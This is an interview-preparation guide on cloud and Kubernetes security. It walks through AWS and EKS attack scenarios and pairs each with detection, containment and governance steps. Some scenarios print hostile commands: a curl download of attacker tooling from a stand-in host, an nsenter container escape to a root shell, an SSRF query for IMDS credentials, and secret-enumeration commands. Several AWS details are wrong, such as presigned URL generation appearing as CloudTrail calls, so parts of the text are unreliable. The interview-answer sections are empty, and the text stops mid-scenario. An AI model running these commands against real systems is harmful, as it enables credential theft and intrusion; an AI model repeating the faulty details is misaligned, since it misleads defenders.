CLOUD & CONTAINER SECURITY
INTERVIEW MASTERY GUIDE
Advanced Preparation for Cloud / Containers Security SME Role — Cybersecurity Technology Engineering (CTE)

 Cloud & Container Security SME Candidate
Prepared: February 2026

# PART 1: THEORY FOUNDATIONS

## 1.1 CWPP — Cloud Workload Protection Platform

CWPP is the runtime guardian embedded inside your workloads — on the EC2 host, within containers, across EKS nodes. It operates at the syscall and process level, capturing what is happening in real time using eBPF-based telemetry, providing visibility that no network or cloud-configuration tool can match.

Detect vs. Prevent Mode — Critical Operational Decision:
- DETECT mode: Alert fires, SOC investigates — attacker may still complete the action
- PREVENT mode: Process killed mid-execution before malicious action completes
- Production containers should run PREVENT for: drift, container escape, kernel exploits, interactive sessions
- Never run DETECT-only for PREVENT-capable policies without documented risk acceptance

## 1.2 CSPM — Cloud Security Posture Management

CSPM is the configuration auditor and compliance enforcer. It does not watch inside workloads — it evaluates how your cloud infrastructure is configured against security benchmarks, identifies attack paths, and tracks remediation over time.

CSPM Finding Lifecycle — The Failure Mode to Avoid:
- Finding Created → Assigned to Team → Ignored (Org Debt) → Weaponized in Breach
- SLA enforcement is the most important CSPM operational control:
- CRITICAL: 24-hour remediation SLA, CISO notification at 12 hours
- HIGH: 48-hour SLA, team lead notification at 24 hours
- MEDIUM: 7-day SLA, tracked in governance dashboard

## 1.3 CIEM — Cloud Infrastructure Entitlement Management

CIEM answers the hardest question in cloud security: "If this identity is compromised, what can an attacker actually do?" It computes effective permissions including transitive role assumption chains, identifies unused privileges, and detects anomalous identity behavior against a behavioral baseline.

## 1.4 KAC — Kubernetes Admission Control

KAC (Kubernetes Admission Controller) is the last line of defense before a workload runs in the cluster. It evaluates every pod creation/modification request against security policies and either admits, mutates, or denies the workload. Falcon's KAC integrates image assessment results directly into admission decisions.

Critical KAC Policies to Enforce (Interview Talking Points):
- readOnlyRootFilesystem: true — prevents drift tool injection
- runAsNonRoot: true — prevents root escalation within container
- allowPrivilegeEscalation: false — blocks setUID escalation
- No hostPID / hostNetwork / hostIPC — prevents namespace escape
- seccompProfile: RuntimeDefault — syscall filtering baseline
- Image must pass Falcon scan with no CRITICAL CVEs — stops vulnerable images
- Image must be signed (cosign/notation) — prevents tampered image deployment
- No privileged: true without approved exception annotation

## 1.5 CWPP vs CSPM vs CIEM — The Mental Model

## 1.6 EKS Security Architecture — Key Knowledge Areas

aws-auth ConfigMap:
Maps IAM roles to Kubernetes RBAC groups. Never map any IAM role to system:masters in production. Use scoped custom ClusterRoles. Audit this ConfigMap weekly via CSPM.
IRSA (IAM Roles for Service Accounts):
Allows pods to assume IAM roles via OIDC. Every IRSA role trust policy must include aws:SourceVpc condition. Without it, the JWT extracted from a pod can be used from any IP address globally.
Kubernetes Audit Logs:
Enable and forward to CloudWatch/SIEM. Key verbs to alert on: exec, secrets list/get, rolebinding create, daemonset create in kube-system, configmap write in kube-system.
Node Group Security:
Managed nodes use AL2/AL2023 AMIs with SSM. Kubelet must run with --anonymous-auth=false and --authorization-mode=Webhook. Security groups must block port 10250 from all non-cluster sources.
etcd Security:
Encrypted at rest (AWS manages for EKS). For self-managed: mutual TLS required, port 2379 accessible only from API server CIDR, enable etcd audit logging.

# PART 2: 15 ADVANCED ATTACK SCENARIOS

Each scenario follows a structured format: Initial Foothold → Escalation → Lateral Movement → Detection Telemetry → False Positive Logic → Root Cause Analysis → Containment → Governance → Interview Pitch.

SCENARIO 1
## 1. EC2 Metadata Service (IMDS v1) Exploitation via SSRF

Domain: EC2 Compromise
### 1. Initial Attacker Foothold

Attacker discovers a Server-Side Request Forgery (SSRF) vulnerability in a web application running on EC2. The app blindly fetches URLs provided by user input.

### 2. Escalation Path

Using SSRF to query http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>, the attacker retrieves temporary AWS credentials (AccessKeyId, SecretAccessKey, SessionToken). These credentials are then used to enumerate S3 buckets, EC2 instances, and IAM roles.

### 3. Lateral Movement Technique

With retrieved credentials, the attacker calls sts:AssumeRole on other roles visible via iam:ListRoles. If the compromised role has iam:PassRole, they create a Lambda function with an admin-level role attached.

### 4. Detection Telemetry

Falcon CWPP: Anomalous HTTP request chain — app process making outbound connection to 169.254.169.254. CloudTrail: GetSecurityToken from unusual user-agent (python-requests vs expected SDK). GuardDuty: UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS if credentials are used from external IP.

### 5. False Positive Differentiation Logic

Legitimate health checks hit the metadata endpoint, but they query specific paths like /latest/meta-data/instance-id. Distinguish by path: /iam/security-credentials/ is never accessed by legitimate apps. Also check user-agent and source process.

### 6. Root Cause Analysis Steps

1) Confirm SSRF endpoint in app logs. 2) Trace all CloudTrail events using the stolen session token. 3) Check GetCallerIdentity events to see where credentials were used. 4) Review the app codebase for the URL-fetch function. 5) Verify if IMDSv2 (token-based) was enforced.

### 7. Containment Workflow

1) Immediately invalidate the EC2 instance profile session via IAM deny policy. 2) Patch or WAF-block the SSRF endpoint. 3) Enforce IMDSv2 (aws ec2 modify-instance-metadata-options --http-tokens required). 4) Rotate all credentials the role could access. 5) Apply CSPM finding to enforce IMDSv2 org-wide via SCP.

### 8. Governance Implications

CIS AWS Benchmark 1.1: Enable IMDSv2 on all EC2 instances. Add CSPM policy to flag any instance with IMDSv1 enabled. Mandate WAF rules for SSRF patterns on all public-facing workloads.

### 9. How to Explain in Interview

SCENARIO 2
## 2. IAM Privilege Escalation via iam:CreatePolicyVersion

Domain: IAM Privilege Escalation
### 1. Initial Attacker Foothold

Attacker compromises an EC2 developer instance with an overly-permissive instance profile that includes iam:CreatePolicyVersion and iam:SetDefaultPolicyVersion.

### 2. Escalation Path

Attacker creates a new version of an existing managed policy, injecting AdministratorAccess into its JSON document, then sets it as the default version. Any principal using that policy now has admin privileges.

### 3. Lateral Movement Technique

With effective admin access, attacker creates a new IAM user with console access, attaches AdministratorAccess, creates long-lived access keys for persistence, then begins enumerating all S3 buckets across the org.

### 4. Detection Telemetry

CloudTrail: iam:CreatePolicyVersion with policy document containing "*:*". iam:SetDefaultPolicyVersion event immediately after. Falcon CIEM: PolicyVersionCreated alert with detected privilege expansion from restricted to admin scope. GuardDuty: Policy:IAMUser/RootCredentialUsage if they escalate to root equivalence.

### 5. False Positive Differentiation Logic

Legitimate DevOps engineers update policy versions during deployments. Key differentiators: (1) Is the new version adding broader permissions than existing? (2) Is the principal a human user vs automated pipeline? (3) Is the action happening outside business hours? (4) Did the same session also run ListRoles or ListBuckets immediately after?

### 6. Root Cause Analysis Steps

1) Pull all CloudTrail events for the compromised access key in a 7-day window. 2) Identify which IAM policy was modified and what permissions were added. 3) List all principals attached to that policy — determine blast radius. 4) Check for any new users/keys created during the incident window. 5) Review the EC2 instance profile — why did a dev instance have iam:CreatePolicyVersion?

### 7. Containment Workflow

1) Revert the policy version to the last known-good version. 2) Deny all sessions originating from the compromised key (IAM inline deny with date condition). 3) Delete any rogue IAM users or access keys created. 4) Remove iam:CreatePolicyVersion from the developer instance profile. 5) Add CSPM rule: alert on any policy version that expands permissions beyond baseline.

### 8. Governance Implications

NIST PR.AC-4: Implement least privilege. Remove iam:CreatePolicyVersion from all non-pipeline principals. All IAM policy changes must go through IaC pipeline with peer review. CIEM should run weekly blast-radius analysis on all instance profiles.

### 9. How to Explain in Interview

SCENARIO 3
## 3. Cross-Account Role Chaining via Misconfigured Trust Policies

Domain: Cross-Account Role Abuse
### 1. Initial Attacker Foothold

Attacker gains initial access via stolen access keys from a developer laptop (exfiltrated from a .env file committed to a public GitHub repo, detected retroactively).

### 2. Escalation Path

The compromised principal belongs to Account A and has sts:AssumeRole. The attacker discovers that a role in Account B (data-analytics-role) has a trust policy allowing any principal from Account A without an External-ID or condition. They assume it and gain access to sensitive data lakes.

### 3. Lateral Movement Technique

From Account B, the attacker discovers a third role in Account C (billing-admin-role) that trusts Account B. Chaining three hops, they reach billing data and attempt to create new resources to establish persistence.

### 4. Detection Telemetry

CloudTrail across all 3 accounts: AssumeRole events with matching session tokens creating a chain. Source IPs do not match any known corporate egress. Falcon CIEM: CrossAccountRoleChain alert showing the 3-hop path with effective permissions computed at each node. GuardDuty: UnauthorizedAccess:IAMUser/TorIPCaller if exiting via anonymizing infrastructure.

### 5. False Positive Differentiation Logic

Cross-account role assumptions are normal in multi-account architectures. False positives arise from legitimate CI/CD pipelines that assume roles across accounts. Key signal is the source IP — pipeline IPs are fixed and known. An assumption from a residential/VPN/Tor IP at an unusual hour with an aws-cli user-agent is highly suspicious. Correlate the chain depth — 3-hop assumptions are almost never legitimate.

### 6. Root Cause Analysis Steps

1) Trace all three AssumeRole events across accounts using linked CloudTrail organization trail. 2) Map the full identity chain from stolen key to final session. 3) Pull all API calls made under each assumed session. 4) Identify which trust policies lacked conditions. 5) Check if External-ID or aws:SourceVpc conditions exist.

### 7. Containment Workflow

1) Revoke all active sessions in all three accounts using IAM deny with DateLessThan condition. 2) Add aws:SourceAccount or aws:PrincipalAccount conditions to all cross-account trust policies. 3) Add SCP to deny sts:AssumeRole from external principals without approved source conditions. 4) Rotate the original compromised access key immediately. 5) Enable AWS Config rule: cross-account trust without condition.

### 8. Governance Implications

Every cross-account trust policy must require aws:SourceAccount, aws:SourceVpc, or ExternalId condition — enforced by a preventive CSPM policy that blocks non-compliant trust policies. Cross-account assumptions must be logged in a central CloudTrail org trail that security owns.

### 9. How to Explain in Interview

SCENARIO 4
## 4. S3 Data Exfiltration via Presigned URL Abuse

Domain: S3 Data Exfiltration
### 1. Initial Attacker Foothold

Attacker compromises a Lambda function that has S3:GetObject permissions, via exposed environment variables in application logs that included the function's execution role credentials.

### 2. Escalation Path

Rather than directly downloading data (which would generate high-volume CloudTrail noise), the attacker generates pre-signed URLs for sensitive objects using s3:GeneratePresignedUrl. These URLs are valid for 7 days and can be fetched from any IP without appearing as API calls from the compromised role.

### 3. Lateral Movement Technique

Pre-signed URL downloads do not appear in CloudTrail as the original role's API calls — they appear as anonymous GET requests in S3 server access logs, often ignored by teams. Attacker also uses aws s3 sync to a bucket in an attacker-controlled AWS account.

### 4. Detection Telemetry

CloudTrail: s3:GeneratePresignedUrl calls for PII objects. S3 Server Access Logs: Large volume of GetObject requests from external IPs. Falcon CSPM: S3LargeVolumeExternalTransfer alert on the sync operation. Macie: Sensitive data access pattern for PII bucket — mass read of objects outside normal access pattern.

### 5. False Positive Differentiation Logic

Applications legitimately generate pre-signed URLs for user file downloads. Differentiate by: (1) Volume — how many objects are being signed in a single session? (2) Object classification — are these classified as PII or sensitive by Macie? (3) Is the Lambda environment expected to do bulk signing? (4) Destination IP for the sync — is it an AWS account in the org?

### 6. Root Cause Analysis Steps

1) Query S3 server access logs for the bucket with high GetObject volume from external IPs. 2) Correlate with CloudTrail GeneratePresignedUrl events from the same time window. 3) Identify which Lambda execution triggered the signing. 4) Review Lambda environment variables in CloudTrail for any PutFunctionConfiguration events. 5) Estimate total data accessed (object sizes × count).

### 7. Containment Workflow

1) Revoke Lambda execution role immediately. 2) Invalidate all pre-signed URLs (change bucket policy to deny requests older than current time). 3) Enable S3 Object Lock on PII buckets. 4) Remove environment variable credentials from Lambda (use IRSA or SSM Parameter Store). 5) Enable S3 server access logging on all buckets with Macie classification.

### 8. Governance Implications

All S3 buckets with Macie-classified sensitive data must have: (1) Object-level logging enabled, (2) S3 Block Public Access active, (3) Pre-signed URL expiry limited to 1 hour via bucket policy, (4) VPC endpoint restriction so S3 is only accessible from within VPC. This is enforced as a CSPM Critical finding.

### 9. How to Explain in Interview

SCENARIO 5
## 5. EKS RBAC Misconfiguration — ClusterRoleBinding to system:masters

Domain: EKS RBAC Misconfiguration
### 1. Initial Attacker Foothold

An IAM role used by a CI/CD pipeline is mapped in the aws-auth ConfigMap to the system:masters Kubernetes group — effectively giving any bearer of that role cluster-admin rights.

### 2. Escalation Path

Attacker compromises the CI/CD pipeline's IAM credentials. They use kubectl with those credentials, discover the system:masters mapping, and use it to list all secrets across all namespaces: kubectl get secrets -A.

### 3. Lateral Movement Technique

From secrets enumeration, attacker finds database credentials, third-party API keys, and other service account tokens. They create a new admin ClusterRoleBinding for a service account they control, establishing persistence that survives IAM credential rotation.

### 4. Detection Telemetry

Kubernetes Audit Logs: list secrets verb from a service account or IAM principal not expected to have that access. Falcon CWPP: KubernetesAudit.SecretEnumeration alert. CloudTrail: sts:AssumeRole for the CI/CD role from an unusual source IP/user-agent. Falcon KAC: If attacker tries to create privileged pods from their persistent access, KAC blocks and alerts.

### 5. False Positive Differentiation Logic

CI/CD pipelines legitimately use IAM roles to deploy to EKS. The differentiator is the RBAC group mapping — a CI/CD role should be mapped to a deploy-only ClusterRole with specific deploy permissions, never system:masters. Also check: is the request coming from the expected pipeline IP range or a known runner?

### 6. Root Cause Analysis Steps

1) Audit aws-auth ConfigMap: kubectl get configmap aws-auth -n kube-system -o yaml. 2) List all ClusterRoleBindings to identify any unexpected system:masters or cluster-admin bindings. 3) Pull Kubernetes audit logs for secrets list/get operations in the past 30 days. 4) Identify all service accounts created in the incident window. 5) Trace IAM events for the CI/CD role from CloudTrail.

### 7. Containment Workflow

1) Remove system:masters mapping from aws-auth — replace with a custom ClusterRole with minimal deploy permissions. 2) Rotate all secrets that were enumerated. 3) Delete any rogue ClusterRoleBindings or ServiceAccounts created by attacker. 4) Apply RBAC audit policy to log all secret access going forward. 5) Implement KAC policy to block any pod creation by service accounts with unexpected cluster-admin access.

### 8. Governance Implications

No IAM role should ever be mapped to system:masters in any cluster. This is a preventive CSPM policy (Critical). CI/CD pipelines should use a custom ClusterRole with only the specific resources needed (deployments, configmaps in specific namespaces). Regular RBAC audits should run weekly via automated scan of all ClusterRoleBindings.

### 9. How to Explain in Interview

SCENARIO 6
## 6. Container Escape via Privileged Container + hostPID Mount

Domain: Container Escape
### 1. Initial Attacker Foothold

A monitoring sidecar was deployed with privileged: true and hostPID: true in the deployment manifest, a misconfiguration that had passed through review because the original legitimate monitoring tool required it. Attacker compromises the main application container via a known CVE.

### 2. Escalation Path

From the compromised app container, the attacker pivots to the privileged sidecar using shared pod networking. With hostPID access, they can see all host processes: nsenter --target 1 --mount --pid --net --uts -- /bin/bash — giving them a root shell on the node.

### 3. Lateral Movement Technique

From the node, the attacker accesses the kubelet credentials, the node's instance profile (IMDS), and can read all other pods' secrets from /var/lib/kubelet/pods/. They enumerate all running pods and target the etcd pod for cluster-wide secret extraction.

### 4. Detection Telemetry

Falcon CWPP: ContainerEscape.NsenterToHostNamespace — detected nsenter with all namespace flags. PotentialPrivilegeEscalation alert for root UID operations from container process. InteractiveContainerSession alert for shell spawned in the context of the privileged container. KAC: (After the fact) — should have blocked privileged:true at admission.

### 5. False Positive Differentiation Logic

Some legitimate tools (node-level monitoring, storage drivers) need privileged access and hostPID. Distinguish by: (1) Was this deployment reviewed and approved? (2) Is nsenter being called interactively (attacker) vs as part of a scripted non-interactive workflow (legitimate)? (3) Is the process tree anomalous — attacker will spawn bash, cat, wget after nsenter.

### 6. Root Cause Analysis Steps

1) Reconstruct the container escape path via Falcon process tree. 2) Identify the CVE exploited in the app container. 3) Review deployment YAML for privileged/hostPID/hostNetwork flags. 4) Check if KAC was in Detect or Prevent mode for privileged container policy. 5) Audit all currently running privileged containers: kubectl get pods -A -o json | jq .items[].spec.containers[].securityContext.

### 7. Containment Workflow

1) Kill the compromised pod immediately. 2) Cordon and drain the node — assume full node compromise. 3) Replace node with fresh AMI. 4) Remove privileged:true and hostPID:true from all deployments that don't require it. 5) Set KAC policy to PREVENT mode for privileged containers with no approved exception annotation. 6) Rotate all secrets on affected node.

### 8. Governance Implications

Pod Security Standards: Enforce Restricted profile cluster-wide. Exception process required for any container needing Privileged or Baseline exemptions, approved by security team. KAC admission policy to block privileged:true, hostPID:true, hostNetwork:true unless pod has a signed exception annotation. Review and audit all existing exceptions quarterly.

### 9. How to Explain in Interview

SCENARIO 7
## 7. Container Drift — Post-Start Offensive Tool Injection

Domain: Drift Detection Events
### 1. Initial Attacker Foothold

Attacker exploits a remote code execution vulnerability in a Node.js API container via a deserialization flaw in a POST request body.

### 2. Escalation Path

Using the RCE, attacker executes: curl -sk https://attacker.io/kit.tgz | tar xz -C /tmp/. This drops: (1) pspy64 — process spy without root, (2) chisel — tunneling tool, (3) linpeas.sh — privilege escalation enumeration. All dropped after container start — not in original image layers.

### 3. Lateral Movement Technique

Using pspy64, attacker monitors cron jobs and environment variables of other processes. Using chisel they establish a reverse tunnel through port 443 to avoid network policy. linpeas.sh identifies SUID binaries and world-writable cron directories on the host (if container is privileged).

### 4. Detection Telemetry

Falcon CWPP: ContainerDrift.OffensiveToolDrop — SHA256 of pspy64 and chisel match known offensive tool hashes in threat intel. New executable written to /tmp post-start triggers drift event. BeaconLikeTraffic.PeriodicC2 from chisel's tunnel keepalive pattern. DNSTunneling alert if attacker pivots to DNS.

### 5. False Positive Differentiation Logic

Debug containers legitimately have tools installed, but this should be controlled. Differentiate by: (1) Are the dropped files on the known offensive tool hash list? (2) Was the file written by a curl/wget process vs a package manager? (3) Does the network traffic match C2 beacon patterns (periodic intervals)? (4) Is the container labeled as a debug container?

### 6. Root Cause Analysis Steps

1) Capture the drift event timestamps — first write event tells you when RCE occurred. 2) Reconstruct the exploit request from application logs around that timestamp. 3) Extract the dropped binary hashes from Falcon telemetry — submit to threat intel. 4) Trace all network connections made by the container after the drift event. 5) Identify the CVE in the Node.js application.

### 7. Containment Workflow

1) Enable Container Drift in PREVENT mode — kills any new executable written post-start. 2) Quarantine the pod (apply blocking NetworkPolicy via Falcon Fusion). 3) Preserve the container filesystem for forensics before deletion. 4) Patch the Node.js deserialization vulnerability immediately. 5) Redeploy from clean image.

### 8. Governance Implications

Container drift prevention should be in PREVENT mode for all production workloads. Debug containers must be explicitly labeled and time-limited (auto-deleted after 2 hours). Image scanning must check for deserialization vulnerabilities in language-specific dependency chains. readOnlyRootFilesystem: true should be enforced via KAC to block tool drops at the filesystem level.

### 9. How to Explain in Interview

SCENARIO 8
## 8. Malicious kubectl exec Abuse for Lateral Movement

Domain: Malicious kubectl exec Abuse
### 1. Initial Attacker Foothold

Attacker obtains a Kubernetes service account token from a leaked kubeconfig file in a public GitHub repository. The service account has exec permissions on pods in the payments namespace.

### 2. Escalation Path

Using kubectl exec, attacker enters the running payments-api pod. From inside, they read environment variables: printenv | grep -i "password|secret|key|token". They find database credentials and a third-party payment processor API key stored as env vars.

### 3. Lateral Movement Technique

With the database credentials, attacker connects to the RDS instance via the pod's network access. They exfiltrate 500,000 customer payment records using SELECT INTO OUTFILE to a controlled endpoint. The database connection is legitimate from the pod's IP — no anomaly at the network layer.

### 4. Detection Telemetry

Kubernetes Audit Log: exec operation from unexpected source IP/user-agent (personal laptop vs expected CI runner). Falcon CWPP: InteractiveContainerSession alert — TTY allocated in production pod. Shell command pattern after exec: env, printenv, cat /etc/*, mysql commands. CloudTrail: No direct event — K8s exec doesn't generate CloudTrail.

### 5. False Positive Differentiation Logic

kubectl exec is used legitimately by developers for debugging. Differentiate by: (1) Is the exec coming from a known developer IP or an unknown external IP? (2) Is the service account expected to have exec permissions in production? (3) What commands are run post-exec — env/printenv are high-signal when accessing a production pod. (4) Is the exec happening during business hours?

### 6. Root Cause Analysis Steps

1) Pull Kubernetes API server audit logs for the exec event — includes source IP, user-agent, and which pod. 2) Identify the service account used — trace back to the leaked kubeconfig. 3) Review all commands run in the exec session via Falcon CWPP interactive session recording. 4) Query database audit logs for the connection from the pod IP. 5) Estimate data exfiltrated from DB query logs.

### 7. Containment Workflow

1) Delete and rotate the compromised service account token immediately. 2) Remove exec permissions from the service account in RBAC. 3) Rotate all credentials found in the pod environment variables. 4) Revoke the database credentials and re-issue. 5) Add RBAC audit: no service account in production namespaces should have pods/exec permission.

### 8. Governance Implications

Production pods should never have exec permissions granted to service accounts. Secrets must not be stored as environment variables — use AWS Secrets Manager via CSI driver or IRSA. All kubectl exec events in production namespaces must generate a PagerDuty alert. Kubeconfig files must be git-ignored and secret-scanning enabled on all repos.

### 9. How to Explain in Interview

SCENARIO 9
## 9. AWS Secrets Manager Theft via Over-Privileged Lambda

Domain: Secrets Manager Theft
### 1. Initial Attacker Foothold

An attacker exploits a command injection vulnerability in a Lambda function exposed via API Gateway. The Lambda has secretsmanager:GetSecretValue on "*" — all secrets in the account.

### 2. Escalation Path

Using the command injection, attacker runs: aws secretsmanager list-secrets; then for each secret: aws secretsmanager get-secret-value --secret-id <name>. Within 60 seconds, they have extracted 47 secrets including: RDS master passwords, third-party API keys, Slack webhooks, payment processor tokens.

### 3. Lateral Movement Technique

Using the extracted RDS master credentials, attacker accesses production databases directly via the Lambda's VPC network access. Using Slack webhooks, they could potentially use them for data exfiltration as an out-of-band channel (HTTPS traffic to Slack is typically allowed).

### 4. Detection Telemetry

CloudTrail: ListSecrets followed by 47 GetSecretValue calls in 60 seconds — highly anomalous. Falcon CWPP: SuspiciousAWSAPICall.Lambda — process making secretsmanager API calls from within injected command context. Falcon CIEM: UnusedPrivilegeExercised — secretsmanager:GetSecretValue on "*" had never been exercised before. GuardDuty: SecretsManager:Lambda/MaliciousIPCaller if external IP triggers the injection.

### 5. False Positive Differentiation Logic

Lambda functions legitimately access Secrets Manager during initialization. Distinguish: (1) Normal access is to 1-5 specific secrets at start. 2) 47 secrets accessed in 60 seconds is never legitimate. (3) ListSecrets is almost never needed by application code — it's an enumeration call. (4) Is the access happening mid-invocation vs at cold start?

### 6. Root Cause Analysis Steps

1) Identify the command injection vector from API Gateway access logs — look for shell metacharacters in request parameters. 2) Pull CloudTrail for all GetSecretValue events from the Lambda execution role. 3) List all secrets accessed — work with App team to determine which were critical. 4) Check for any outbound connections made during the exploit window (VPC Flow Logs). 5) Review Lambda function code for the injection point.

### 7. Containment Workflow

1) Disable the Lambda function (set concurrency to 0) immediately. 2) Rotate all 47 accessed secrets. 3) Restrict secretsmanager policy to list only specific secret ARNs the function needs. 4) Patch the command injection vulnerability. 5) Add WAF rule to block shell metacharacters in API Gateway inputs. 6) Apply resource-based policy on secrets to deny access from Lambda except specific function ARNs.

### 8. Governance Implications

No application should have secretsmanager:GetSecretValue on "*". Every secret access permission must specify exact ARNs. Secrets must be tagged with owning service, and IAM policy condition must require matching resource tag. ListSecrets should be denied for all application roles — only security tooling needs discovery. Secrets rotation should be automated and enabled.

### 9. How to Explain in Interview

SCENARIO 10
## 10. IRSA External Abuse — Service Account JWT Used Outside VPC

Domain: IAM Privilege Escalation
### 1. Initial Attacker Foothold

Attacker exploits a container escape (via CVE-2022-0847 Dirty Pipe) in a payments pod and extracts the service account JWT from /var/run/secrets/kubernetes.io/serviceaccount/token before the container is killed.

### 2. Escalation Path

The pod's service account has an IRSA annotation binding it to an IAM role. From an external server, attacker calls: aws sts assume-role-with-web-identity --web-identity-token <JWT> --role-arn <arn>. The role has no aws:SourceVpc condition, so this succeeds from any IP. They now have temporary credentials for the payments IAM role.

### 3. Lateral Movement Technique

The payments role has S3 access to the payments data bucket and can read SSM parameters. Attacker accesses SSM Parameter Store where database passwords are stored as SecureString parameters. They also discover the role can assume a cross-account analytics role with access to 3 years of transaction data.

### 4. Detection Telemetry

CloudTrail: AssumeRoleWithWebIdentity from an external IP (not a VPC IP, not a pod CIDR). UserAgent: aws-cli vs expected AWS SDK with service-specific user agent. Falcon CIEM: ExternalIRSAAbuse alert — role assumed with web identity from non-VPC source. CIEM correlates this with the prior KernelTampering alert from the same pod.

### 5. False Positive Differentiation Logic

IRSA is normally called from within the pod — the AWS SDK automatically fetches the JWT and calls STS. External calls always use aws-cli or python boto3 with explicit --web-identity-token flag. No legitimate workload calls AssumeRoleWithWebIdentity from outside a VPC. This alert is virtually always a true positive.

### 6. Root Cause Analysis Steps

1) Identify which pod the JWT was stolen from via Falcon CWPP process telemetry. 2) Check the JWT expiry (default 24h for EKS) — how long did attacker have access? 3) Pull all CloudTrail events for the assumed role session. 4) Check if the role had aws:SourceVpc condition — if not, this was preventable. 5) List all role assumption paths from the stolen role (CIEM blast radius).

### 7. Containment Workflow

1) Modify the IAM role trust policy immediately: add aws:SourceVpc condition. 2) Invalidate the JWT by deleting and recreating the Kubernetes ServiceAccount. 3) Revoke the STS session: apply IAM deny policy with DateLessThan condition. 4) Rotate SSM parameters accessed by the attacker. 5) Add aws:SourceVpc as a mandatory condition on ALL IRSA roles — enforce via SCP.

### 8. Governance Implications

Every IRSA role trust policy must include aws:SourceVpc condition — this is a preventive CSPM Critical control. Any IRSA role without this condition triggers immediate remediation. KAC admission policy must enforce runAsNonRoot and seccompProfile to reduce likelihood of container escape that enables token extraction.

### 9. How to Explain in Interview

SCENARIO 11
## 11. EKS Node Compromise via Exposed Kubelet API (Port 10250)

Domain: EC2 Compromise
### 1. Initial Attacker Foothold

An EKS managed node group was deployed with a security group that inadvertently allows inbound port 10250 from 0.0.0.0/0 — a CSPM finding open for 34 days. Attacker discovers it via Shodan.

### 2. Escalation Path

The kubelet API at port 10250 without authentication (anonymous auth enabled) allows: listing all pods (GET /pods), reading pod logs (GET /containerLogs/namespace/pod/container), and executing commands in pods (POST /exec/namespace/pod/container). Attacker uses this to exec into every pod on the node.

### 3. Lateral Movement Technique

From exec access across all pods, attacker harvests environment variables, reads mounted secrets, and extracts service account tokens from /var/run/secrets. With service account tokens, they access the Kubernetes API to enumerate all resources cluster-wide.

### 4. Detection Telemetry

Falcon CWPP: KubeletAnonymousAuth alert on node. Anomalous commands executed across multiple containers from external source (kubelet API does not log through Kubernetes audit by default). CSPM Finding: SG 10250 open to 0.0.0.0/0 — 34 days. GuardDuty: Recon:EC2/PortProbeUnprotectedPort for the initial scanning.

### 5. False Positive Differentiation Logic

The kubelet port is only legitimately accessed by the API server (from within cluster) and monitoring agents. Any external access to port 10250 from a non-cluster IP is malicious by definition. GuardDuty port probe alert + kubelet anonymous auth enabled + security group misconfiguration = confirmed attack scenario.

### 6. Root Cause Analysis Steps

1) Pull all kubelet API request logs from CloudWatch (kubelet logs forwarded to CW). 2) Identify all exec and log requests made via the kubelet API from external IPs. 3) Determine which pods were accessed and what data was reachable. 4) Audit the security group creation — which CloudFormation/Terraform change opened port 10250. 5) Check anonymous auth config in kubelet configuration file.

### 7. Containment Workflow

1) Immediately update security group to remove port 10250 from 0.0.0.0/0. 2) Restrict to cluster API server CIDR only. 3) Enable Webhook authentication mode on kubelet (--authorization-mode=Webhook). 4) Disable anonymous auth (--anonymous-auth=false in kubelet config). 5) Rotate all service account tokens on the affected node. 6) Cordon and replace the node.

### 8. Governance Implications

CIS EKS Benchmark 3.2.1: Ensure kubelet anonymous auth is disabled. CIS 3.2.2: Ensure kubelet authorization mode is not AlwaysAllow. CSPM must flag any security group allowing inbound port 10250 or 10255 from 0.0.0.0/0 as Critical. EC2 security group reviews should include cluster ports in the audit scope.

### 9. How to Explain in Interview

SCENARIO 12
## 12. Supply Chain Attack — Compromised Helm Chart in Artifact Hub

Domain: Container Escape
### 1. Initial Attacker Foothold

An attacker takes over a popular third-party Helm chart on Artifact Hub by compromising the maintainer's GitHub account. They inject a malicious InitContainer into the chart that runs before the main application and exfiltrates cluster credentials.

### 2. Escalation Path

The malicious InitContainer runs as root, reads the service account token from /var/run/secrets, reads all mounted ConfigMaps and Secrets, and beacons the data to an external endpoint. Since it's an InitContainer, it completes before the main app starts and appears in pod logs as a normal initialization step.

### 3. Lateral Movement Technique

With the exfiltrated service account tokens, the attacker maps the effective permissions of each. A token from a namespace with broad permissions is used to list all pods and secrets cluster-wide, identifying higher-value targets for follow-up attacks.

### 4. Detection Telemetry

Falcon CWPP: First-seen outbound connection from InitContainer to external domain. SuspiciousChildProcess in init container context. Falcon Image Assessment: The Helm chart's InitContainer image fails trust verification — image is not from an approved registry. KAC: Blocks deployment if image policy is enforced. Network: Beacon to unknown domain from a container that should only be doing initialization tasks.

### 5. False Positive Differentiation Logic

InitContainers legitimately run setup tasks and may make network calls (waiting for dependencies, downloading config). Distinguish: (1) Is the InitContainer image from an approved registry and cryptographically signed? (2) Is it making calls to an unknown external domain? (3) Does the Helm chart changelog justify the new InitContainer? (4) Is the InitContainer reading secrets or env vars unnecessarily?

### 6. Root Cause Analysis Steps

1) Compare new Helm chart version against previous known-good version (git diff of chart templates). 2) Identify when the Artifact Hub chart was modified — check chart maintainer's GitHub activity. 3) Pull Falcon telemetry for all deployments of the affected Helm chart across the organization. 4) Extract the InitContainer image — sandbox it to confirm malicious behavior. 5) Enumerate all namespaces where the chart was deployed.

### 7. Containment Workflow

1) Immediately helm rollback to the last known-good version in all affected namespaces. 2) Rotate all service account tokens in affected namespaces. 3) Block the malicious InitContainer image in KAC image policy. 4) Add the C2 domain/IP to DNS blocklist and security group deny. 5) Pin all Helm chart versions to specific digests, not floating version tags.

### 8. Governance Implications

All third-party Helm charts must be pulled into an internal Harbor or ECR registry, scanned and signed before use. No direct Artifact Hub or public registry pulls in production. Helm chart updates require security review and testing in a sandbox before production rollout. OPA/KAC policy to block InitContainers from unapproved registries.

### 9. How to Explain in Interview

SCENARIO 13
## 13. AWS Config Rule Weaponization — Persistent Backdoor via Trusted Service

Domain: Cross-Account Role Abuse
### 1. Initial Attacker Foothold

A contractor with temporary AWS access uses their credentials to create a backdoor before their access is scheduled to expire. They create an AWS Config rule with a Lambda remediation action.

### 2. Escalation Path

The Lambda is designed to re-create an IAM role with AdministratorAccess every time AWS Config runs the rule (every 24 hours). Even if defenders detect and delete the backdoor role, Config will recreate it within 24 hours. The Lambda itself uses a legitimate AWS service (Config) as its trigger, making it blend in with normal Config activity.

### 3. Lateral Movement Technique

With persistent admin-level IAM access, attacker can access any resource in the account across sessions. They use time in low and slow — reading data incrementally over weeks to avoid volume-based detection, focusing on highly sensitive data like executive communications in S3.

### 4. Detection Telemetry

